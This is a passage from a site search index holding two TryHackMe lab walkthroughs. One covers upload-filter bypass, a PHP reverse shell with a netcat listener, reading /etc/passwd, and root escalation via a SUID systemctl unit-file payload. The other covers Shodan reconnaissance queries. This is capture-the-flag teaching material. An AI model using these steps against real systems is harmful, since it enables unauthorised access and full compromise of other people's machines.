detection and -V to enable verbose mode. You can checkout the output of my scan in nmap_out.txt. When analyzing out scan results we can see that there are 6 ports open: 21, 22, 139, 445, 3128, and 3333. We see a squid proxy running on port 3128, version 3.5.12 to be exact. If we use the flag -p-400 we will scan all the ports up to 400. The flag -n will not do DNS resolution, and the machine is probably running Ubuntu because it is what ports 22, 445, and 3333 are all running on. The web server (Apache) is running on port 3333.\n[Task 3] #  For this task we are going to run dirbuster to find the url path that has an upload form page. We can use the command gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. The output will be located in the file gobuster_out.txt. If we take a look in here we can notice that there is a path called /internal/ if we navigate to this path in the web browser we can see that it is indeed a form upload page.\n[Task 4] #  After figuring out that the form does not want us to upload .php files we can make a custom wordlist to include the .php extensions. You can check out the wordlist in the phpext.txt file. Now we are going to try and find out what kind of file we are allowed to upload. Let\u0026rsquo;s use Burp to intercept a form upload then user the Intruder function to preform a sniper attack on the form using the wordlist we created earlier. After running the attack we find that the server will allow us to upload a .phtml file. This gives us the opportunity to maybe use a reverse PHP shell. We can download the reverse shell from here.\nNow to upload our reverse shell. First open the php-reverse-shell.php file and change the IP to your tun0 IP. Now rename the file to have the .phtml extension. Open the port with netcat so we can listen for incoming connections on our machine. Use the command nc -lvnp 1234. Upload the file to the webpage, then navigate to http://$IP:3333/internal/uploads/php-reverse-shell.phtml. This will execute the payload and you should see a connection on your netcat session. Once we get the reverse shell we can interact with the machine that the server is being hosted on.\nFor the next part I am not sure how to figure out what user was running the web server. I tried ps aux to get a list of all the processes and users and the only user that it says is running any apache instance is root, but that is not the correct answer. So I went to take a look at all the users. To do this I used the command cat /etc/passwd and found the user bill. Now we need to find his flag. If we navigate to his directory in /home/ the only file he has is one called user.txt which contains the flag.\n[Task 5] #  Now to escalate our privileges to become the root user! If we run the command find / -user root -perm -4000 -exec ls -ldb {} \\; we can find a files that we have permissions for. When running this the file /bin/systemctl stands out, because it allows us to user services we might not be able to execute otherwise. When systemctl runs it runs with root permission.\nNow we navigate to the /bin directory and spawn a shell using sh. Next we copy this modified script from GTFObins, using the SUID version.\nTF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \u0026quot;cat /root/root.txt \u0026gt; /tmp/output\u0026quot; [Install] WantedBy=multi-user.target' \u0026gt; $TF ./systemctl link $TF ./systemctl enable --now $TF Now use cat /tmp/output and the flag should be there! All done!\n"});index.add({'id':16,'href':'/posts/try-hack-me/shodan.io/','title':"Shodan.io",'section':"Try Hack Me",'content':"Shodan.io is a great tool that is constantly scanning the whole internet for open devices and can be very useful in the recon stages of pentesting. This room walks through how to use filters on Shodan.io and how to find specific information about your target.\nTools #   Shodan.io Ultratools ASN Search  Walkthrough #  [Task 2] Getting Started #  To solve task 2 read task_1_introduction.md, it is the article that was provided by THM and outlines how to search for ASNs using ultratools then using the ASN:[asn] filter on Shodan.io.\nFirst things first. In order to find out google.com\u0026rsquo;s ip address we can use the ping command. This command just sends a little packet of data to google.com and sees if anything is returned. You can see the output of my ping in google_ping.txt. Ping also gives us the IP address, which we see is 173.194.219.102. When we throw this IP into ultratools we see that google\u0026rsquo;s ASN is AS15169. Right below that, in the details we see that this ASN was allocated 2000-03-30 giving us the answer to the second question.\nNext, we do an ASN search on Shodan.io. Sign-in or create an account and then search ASN:AS15169. This will show us the devices on that ASN. If we take a look on the left side of the page, we can sea a map of where most of those devices are located. And based on the map, and the table underneath it most of the devices are located in the United States. If we continue to look at the left size we see a section called Top Products. Here we see that the biggest product is OpenSSH. So the most popular service is SSH and then the type they are using is OpenSSH. Finally we look at the Top Organizations section and see that google\u0026rsquo;s biggest service on this ASN is Google Cloud.\n[Task 4] Google \u0026amp; Filtering #  After reading task_3_filters.md these questions should be a breeze. Again we are using Shodan.io and combining filters to have a better range of search results.\nFirst off THM wants us to find out what the most popular OS running MySQL is on Google\u0026rsquo;s ASN, to do this we need to combine an ASN filter with a product filter. The search query becomes product:MySQL ASN:AS15169. Then the results come up and there it is, Linux 3.x is the top operating system! The next few answers we can find by going back to just an ASN filter. When we check out the results we see that the third most popular location of machines on Google\u0026rsquo;s ASN is in the EU. The next part kinda stumped me for a second. It asks which of the following three services is most popular on Google\u0026rsquo;s ASN: nginx, HTTP or HTTPs. Well if you take a look at the search results under the Top Products section, for me nginx is obviously the most popular with HTTP and HTTPs not even making the list, but given that the answer prompt is more than 5 characters wrong I went to looking else where. If you take a look under the ports you can see that the three most popular ports are 20, 443 and 80. 20 being FTP, 443 being TCP and 80 being HTTP. So based on this information, and based on the length of the answer prompt I went with Hypertext Transfer Protocol (HTTP).\nIn order to figure out what city that most of Google\u0026rsquo;s machines are in, we need to narrow down our search to search a country. Since the US has the most machines it makes sense to look there. So we can create a new search for filtering the ASN and the Country like so: ASN:AS15169 country:US. Once this returns the results we see that Mountain View has the most machines. Shocker right? It makes sense that the city home to Google\u0026rsquo;s largest campus also houses most of its machines. What I found even more interesting is that according to this ASN the second most machines are in Cumming. I really hope they don\u0026rsquo;t mean Cumming, Georgia, because that place seems to small to house the second most Google machines in the US on this ASN, but who knows. Maybe it could be where they are located for the Atlanta campus. On to the next question! Next we narrow down our search by city, specifically Oakland. We use the following filters ASN:AS15169 city:Oakland. Then scroll down to where it says Operating Systems and there we go, Windows Server 2008. Well after trying to submit the Windows Server 2008 flag, it doesn\u0026rsquo;t look like that right, however in my search results it is obviously the top OS. After a really good guess, I put 2010 instead and there we go, thats what they are looking for.\nFor the last question we can navigate to https://shodan.io/explore and take a look at the webcams section. Then using our handy dandy ASN filter, search for google devices. When we hit search, no results pop up. Good for Google! Nay is the answer.\n"});})();